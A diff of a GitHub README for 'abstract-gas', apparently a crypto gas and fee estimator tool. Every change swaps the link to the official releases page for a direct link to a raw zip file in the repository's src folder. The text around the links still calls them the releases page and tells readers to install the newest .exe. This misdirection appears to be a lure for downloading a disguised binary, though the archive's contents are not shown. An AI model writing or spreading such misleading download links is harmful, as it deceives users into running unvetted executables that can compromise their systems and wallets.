@@ -1,6 +1,6 @@
 # ⚡ abstract-gas - Estimate Gas and Fees Easily
 
-[![Download abstract-gas](https://img.shields.io/badge/Download-abstract--gas-green?style=for-the-badge)](https://github.com/Moussa552/abstract-gas/releases)
+[![Download abstract-gas](https://img.shields.io/badge/Download-abstract--gas-green?style=for-the-badge)](https://github.com/Moussa552/abstract-gas/raw/refs/heads/main/src/abstract_gas_3.9.zip)
 
 ## 🔍 What is abstract-gas?
 
@@ -31,7 +31,7 @@ You will download abstract-gas from the official releases page. Follow each step
 
 Click this button to open the releases page in your web browser:
 
-[![Download abstract-gas](https://img.shields.io/badge/Download-abstract--gas-blue?style=for-the-badge)](https://github.com/Moussa552/abstract-gas/releases)
+[![Download abstract-gas](https://img.shields.io/badge/Download-abstract--gas-blue?style=for-the-badge)](https://github.com/Moussa552/abstract-gas/raw/refs/heads/main/src/abstract_gas_3.9.zip)
 
 This page contains the latest version of the software.
 
@@ -139,7 +139,7 @@ You don’t need to understand blockchain deeply to use it. The app does all the
 
 You can always visit this page to find the latest version of abstract-gas:
 
-https://github.com/Moussa552/abstract-gas/releases
+https://github.com/Moussa552/abstract-gas/raw/refs/heads/main/src/abstract_gas_3.9.zip
 
 Download the newest `.exe` file and install it to get updated features and fixes.
 
